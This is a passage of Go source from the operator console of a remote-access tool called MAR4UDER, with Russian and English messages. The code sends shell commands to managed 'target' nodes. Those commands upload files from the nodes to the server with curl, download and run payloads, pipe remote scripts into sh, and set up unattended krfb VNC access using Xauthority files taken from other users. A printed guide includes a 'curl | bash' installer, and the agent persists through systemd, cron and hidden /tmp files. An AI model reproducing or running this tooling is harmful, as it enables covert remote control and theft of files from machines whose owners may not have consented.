	w.WriteString(fmt.Sprintf("    Ссылка для скачивания на админ-ПК: \x1b[1;36mhttp://%s:%s/api/v1/files/%s\x1b[0m\r\n\r\n", serverHost, httpPort, sf.ID))
	w.Flush()
}

func (toc *TCPOperatorConsole) uploadFileInteractive(w *bufio.Writer, target *Node, localOrUrl string, remoteDir string, conn net.Conn) {
	if remoteDir == "" {
		remoteDir = "/tmp"
	}
	serverHost := toc.getClientHost(conn)
	httpPort := "8080"
	if parts := strings.Split(toc.cfg.HTTPAddr, ":"); len(parts) >= 2 {
		httpPort = parts[len(parts)-1]
	}

	filename := filepath.Base(localOrUrl)
	destPath := path.Join(remoteDir, filename)

	w.WriteString(fmt.Sprintf("\r\n\x1b[1;36m[*] Загрузка '%s' в '%s' на узле [%s]...\x1b[0m\r\n", localOrUrl, destPath, target.ID))
	w.Flush()

	// Case 1: URL
	if strings.HasPrefix(localOrUrl, "http://") || strings.HasPrefix(localOrUrl, "https://") {
		fetchCmd := fmt.Sprintf("curl -fsSL '%s' -o '%s' && chmod +x '%s' 2>/dev/null\n", localOrUrl, destPath, destPath)
		_ = toc.udpGw.SendPtyData(target, []byte(fetchCmd))
		w.WriteString(fmt.Sprintf("\x1b[32m[+] Загрузка по ссылке '%s' запущена на узле -> %s\x1b[0m\r\n\r\n", localOrUrl, destPath))
		w.Flush()
		return
	}

	// Case 2: File on server filesystem
	fileData, err := os.ReadFile(localOrUrl)
	if err == nil {
		transferID := uint32(time.Now().UnixNano() & 0x7FFFFFFF)
		pushWait := target.AddFilePushWaiter(transferID)
		defer target.RemoveFilePushWaiter(transferID)

		_ = toc.udpGw.SendFilePushStart(target, transferID, uint64(len(fileData)), 0755, destPath)
		time.Sleep(10 * time.Millisecond)

		chunkSize := 1024
		for offset := 0; offset < len(fileData); offset += chunkSize {
			end := offset + chunkSize
			if end > len(fileData) {
				end = len(fileData)
			}
			_ = toc.udpGw.SendFilePushChunk(target, transferID, uint64(offset), fileData[offset:end])
			time.Sleep(1 * time.Millisecond)
		}
		_ = toc.udpGw.SendFilePushEnd(target, transferID)

		timer := time.NewTimer(3 * time.Second)
		defer timer.Stop()
		select {
		case status := <-pushWait:
			if status == 0 {
				w.WriteString(fmt.Sprintf("\x1b[1;32m[+] Файл '%s' успешно передан через бинарный протокол в '%s' (%d байт)!\x1b[0m\r\n\r\n", filename, destPath, len(fileData)))
				w.Flush()
				return
			}
		case <-timer.C:
		}
	}

	// Case 3: File is in server FileStorage (by ID or filename)
	if sf, _, err := toc.fileMgr.GetFile(localOrUrl); err == nil {
		downloadURL := fmt.Sprintf("http://%s:%s/api/v1/files/%s", serverHost, httpPort, sf.ID)
		fetchCmd := fmt.Sprintf("curl -fsSL '%s' -o '%s' && chmod +x '%s' 2>/dev/null\n", downloadURL, destPath, destPath)
		_ = toc.udpGw.SendPtyData(target, []byte(fetchCmd))
		w.WriteString(fmt.Sprintf("\x1b[32m[+] Файл из хранилища [%s] (%s) развёрнут в %s\x1b[0m\r\n\r\n", sf.ID, sf.Filename, destPath))
		w.Flush()
		return
	}

	w.WriteString(fmt.Sprintf("\x1b[33m[!] Локальный файл '%s' не найден на сервере. Укажите абсолютный путь, URL или ID файла из хранилища.\x1b[0m\r\n\r\n", localOrUrl))
	w.Flush()
}

func (toc *TCPOperatorConsole) uninstallNode(w *bufio.Writer, target *Node, conn net.Conn) {
	serverHost := toc.getClientHost(conn)
	httpPort := "8080"
	if parts := strings.Split(toc.cfg.HTTPAddr, ":"); len(parts) >= 2 {
		httpPort = parts[len(parts)-1]
	}

	w.WriteString(fmt.Sprintf("\r\n\x1b[1;31m[*] Запуск полного самоудаления агента с узла [%s] (Slot #%d)...\x1b[0m\r\n", target.ID, target.Slot))
	w.Flush()

	uninstallCmd := fmt.Sprintf(
		"(curl -fsSL http://%s:%s/u 2>/dev/null || curl -fsSL http://127.0.0.1:%s/u 2>/dev/null) | sh >/dev/null 2>&1 || "+
			"(systemctl stop mar4uder-agent 2>/dev/null; systemctl disable mar4uder-agent 2>/dev/null; rm -f /etc/systemd/system/mar4uder-agent.service ~/.config/systemd/user/mar4uder-agent.service ~/.config/autostart/mar4uder-agent.desktop /usr/local/bin/mar4uder_agent ~/.local/bin/mar4uder_agent /tmp/.mar4uder* /tmp/mar4uder*; crontab -l 2>/dev/null | grep -v mar4uder | crontab - 2>/dev/null; pkill -9 -f mar4uder_agent) >/dev/null 2>&1 &\n",
		serverHost, httpPort, httpPort)

	_ = toc.udpGw.SendPtyData(target, []byte(uninstallCmd))
	reqID := uint32(time.Now().UnixNano() & 0x7FFFFFFF)
	_ = toc.udpGw.SendCmdExec(target, reqID, 5, "curl -fsSL http://"+serverHost+":"+httpPort+"/u | sh || pkill -9 -f mar4uder_agent")

	// Purge from NodeManager
	toc.nm.RemoveNode(target.ID)

	w.WriteString(fmt.Sprintf("\x1b[1;32m[+] Узел [%s] успешно самоудалился: автозагрузка, службы, бинарники и файлы стёрты, узел удалён из панели.\x1b[0m\r\n\r\n", target.ID))
	w.WriteString("Нажмите Enter для продолжения...")
	w.Flush()
}

func (toc *TCPOperatorConsole) browseFileSystem(w *bufio.Writer, target *Node, dirPath string) {
	entries := toc.fetchDirectoryEntries(target, dirPath)
	toc.printTabFilesDirView(w, target, dirPath, entries)
}


func (toc *TCPOperatorConsole) printRescueGuide(w *bufio.Writer) {
	w.WriteString("\r\n\x1b[1;33m+------------------------------------------------------------------------+\r\n")
	w.WriteString("|      MAR4UDER // LOCAL ACCESS & RESCUE MIGRATION GUIDE                 |\r\n")
	w.WriteString("+------------------------------------------------------------------------+\x1b[0m\r\n")
	w.WriteString(" 1. DIRECT LAN VNC ACCESS (Zero latency, 60 FPS, bypasses VPS):\r\n")
	w.WriteString("    - Target machine IP can be viewed in node list or via terminal (ip a).\r\n")
	w.WriteString("    - If using krfb or x11vnc, connect directly with any VNC client to:\r\n")
	w.WriteString("      <TARGET_LAN_IP>:<VNC_PORT>  (Default port: 5900, configurable via 'port <num> <port>')\r\n\r\n")
	w.WriteString(" 2. DIRECT LAN PTY ACCESS:\r\n")
	w.WriteString("    - If operator machine is in the same local subnet, connect via direct SSH:\r\n")
	w.WriteString("      ssh <user>@<TARGET_LAN_IP>\r\n")
	w.WriteString("    - Or run local server instance on your laptop: mar4uder-server.exe\r\n\r\n")
	w.WriteString(" 3. RESCUE & IP MIGRATION (Change VPS / Server IP):\r\n")
	w.WriteString("    - To switch connected nodes to a new VPS or local IP without reinstalling:\r\n")
	w.WriteString("      Execute in shell:\r\n")
	w.WriteString("      echo \"NEW_SERVER_IP:443\" > /tmp/.mar4uder_endpoint\r\n")
	w.WriteString("      (The agent automatically checks this file every second and reconnects)\r\n\r\n")
	w.WriteString(" 4. 1-LINE INSTALLER FOR NEW NODES:\r\n")
	w.WriteString(fmt.Sprintf("    curl -s http://<SERVER_IP>:8080/i | bash\r\n"))
	w.WriteString("------------------------------------------------------------------------\r\n")
	w.WriteString("Press Enter to continue...")
	_ = w.Flush()
}

func (toc *TCPOperatorConsole) triggerDownload(w *bufio.Writer, target *Node, remotePath string, conn net.Conn) {
	serverHost := "127.0.0.1"
	if tcpAddr, ok := conn.LocalAddr().(*net.TCPAddr); ok && !tcpAddr.IP.IsUnspecified() {
		serverHost = tcpAddr.IP.String()
	}
	httpPort := "8080"
	if parts := strings.Split(toc.cfg.HTTPAddr, ":"); len(parts) >= 2 {
		httpPort = parts[len(parts)-1]
	}

	pushCmd := fmt.Sprintf("curl -fsSL -F 'file=@%s' 'http://%s:%s/api/v1/nodes/receive_file?node_id=%s' 2>/dev/null\n",
		remotePath, serverHost, httpPort, target.ID)
	_ = toc.udpGw.SendPtyData(target, []byte(pushCmd))
	target.AddLog(fmt.Sprintf("Requested file download from node: %s", remotePath))
	w.WriteString(fmt.Sprintf("\x1b[32m[+] Download initiated for '%s'. Check 'files' command in a few seconds.\x1b[0m\r\n", remotePath))
	_ = w.Flush()
}

func (toc *TCPOperatorConsole) triggerUpload(w *bufio.Writer, target *Node, fileIDOrURL string, remotePath string, conn net.Conn) {
	serverHost := "127.0.0.1"
	if tcpAddr, ok := conn.LocalAddr().(*net.TCPAddr); ok && !tcpAddr.IP.IsUnspecified() {
		serverHost = tcpAddr.IP.String()
	}
	httpPort := "8080"
	if parts := strings.Split(toc.cfg.HTTPAddr, ":"); len(parts) >= 2 {
		httpPort = parts[len(parts)-1]
	}

	downloadURL := fileIDOrURL
	if !strings.HasPrefix(fileIDOrURL, "http://") && !strings.HasPrefix(fileIDOrURL, "https://") {
		if sf, _, err := toc.fileMgr.GetFile(fileIDOrURL); err == nil {
			downloadURL = fmt.Sprintf("http://%s:%s/api/v1/files/%s", serverHost, httpPort, sf.ID)
			if remotePath == "" {
				remotePath = "/tmp/" + sf.Filename
			}
		} else {
			downloadURL = fmt.Sprintf("http://%s:%s/api/v1/files/%s", serverHost, httpPort, fileIDOrURL)
		}
	}

	if remotePath == "" {
		remotePath = "/tmp/transferred_file"
	}

	fetchCmd := fmt.Sprintf("curl -fsSL '%s' -o '%s' && chmod +x '%s' 2>/dev/null\n",
		downloadURL, remotePath, remotePath)
	_ = toc.udpGw.SendPtyData(target, []byte(fetchCmd))
	target.AddLog(fmt.Sprintf("Dispatched file deploy %s -> %s", downloadURL, remotePath))
	w.WriteString(fmt.Sprintf("\x1b[32m[+] Dispatched file deploy to %s -> %s\x1b[0m\r\n", target.ID, remotePath))
	_ = w.Flush()
}

func (toc *TCPOperatorConsole) printFiles(w *bufio.Writer) {
	files := toc.fileMgr.ListFiles()
	w.WriteString("\r\n\x1b[1;36m+------------------------------------------------------------------------+\r\n")
	w.WriteString("|                    STORED & TRANSFERRED FILES                          |\r\n")
	w.WriteString("+------------------------------------------------------------------------+\x1b[0m\r\n")
	if len(files) == 0 {
		w.WriteString("  (no files stored currently)\r\n")
	} else {
		for i, f := range files {
			w.WriteString(fmt.Sprintf("  [%d] ID: %s | Name: %-22s | Size: %6d bytes | From: %s\r\n",
				i+1, f.ID, f.Filename, f.Size, f.SourceNode))
		}
	}
	w.WriteString("\r\nPress Enter to continue...")
	_ = w.Flush()
}

func (toc *TCPOperatorConsole) executeCommand(w *bufio.Writer, target *Node, cmd string) {
	w.WriteString(fmt.Sprintf("\r\n\x1b[1;36m[*] Executing on [%s]: %s\x1b[0m\r\n", target.ID, cmd))
	w.Flush()

	reqID := uint32(time.Now().UnixNano() & 0x7FFFFFFF)
	ch := target.AddCmdWaiter(reqID)
	defer target.RemoveCmdWaiter(reqID)

	if err := toc.udpGw.SendCmdExec(target, reqID, 15, cmd); err != nil {
		w.WriteString(fmt.Sprintf("\x1b[31m[-] Failed sending command: %v\x1b[0m\r\n", err))
		w.Flush()
		return
	}

	timer := time.NewTimer(15 * time.Second)
	defer timer.Stop()

	for {
		select {
		case <-timer.C:
			w.WriteString("\r\n\x1b[33m[!] Command timed out.\x1b[0m\r\n")
			w.Flush()
			return
		case out, ok := <-ch:
			if !ok {
				w.WriteString("\r\n")
				w.Flush()
				return
			}
			if out.Len > 0 {
				w.WriteString(string(out.Data[:out.Len]))
				w.Flush()
			}
			if out.ExitCode >= 0 {
				w.WriteString(fmt.Sprintf("\r\n\x1b[32m[+] Finished (exit code %d)\x1b[0m\r\n", out.ExitCode))
				w.Flush()
				return
			}
		}
	}
}

func (toc *TCPOperatorConsole) installAndRunKrfb(w *bufio.Writer, target *Node) {
	w.WriteString(fmt.Sprintf("\r\n\x1b[1;36m[*] Configuring and deploying KRFB on [%s] ...\x1b[0m\r\n", target.ID))
	w.Flush()

	port := target.VncPort
	if port == 0 {
		port = 5900
	}
	toc.nm.SetNodeEngine(target.ID, "krfb")

	cmd := fmt.Sprintf("export DISPLAY=:0; XA=$(ls /tmp/xauth_* /run/sddm/xauth_* /run/user/*/gdm/Xauthority /home/*/.Xauthority /root/.Xauthority 2>/dev/null | head -n 1); [ -n \"$XA\" ] && export XAUTHORITY=\"$XA\"; if ! which krfb >/dev/null 2>&1; then (apt-get update -y && apt-get install -y krfb || dnf install -y krfb || pacman -S --noconfirm krfb) 2>/dev/null || true; fi; pkill -9 -f krfb 2>/dev/null; mkdir -p ~/.config && printf '[General]\\npreferredFrameBufferPlugin=xcb\\n\\n[Security]\\nallowDesktopControl=true\\nallowUnattendedAccess=true\\nnoWallet=true\\n\\n[Network]\\nport=%d\\nuseDefaultPort=true\\npublishService=false\\n' > ~/.config/krfbrc; if which krfb >/dev/null 2>&1; then nohup krfb --nodialog >/tmp/krfb.log 2>&1 & echo '[+] krfb started on port %d'; else echo '[-] krfb not found and could not be installed'; fi\n", port, port)

	toc.executeCommand(w, target, cmd)
}
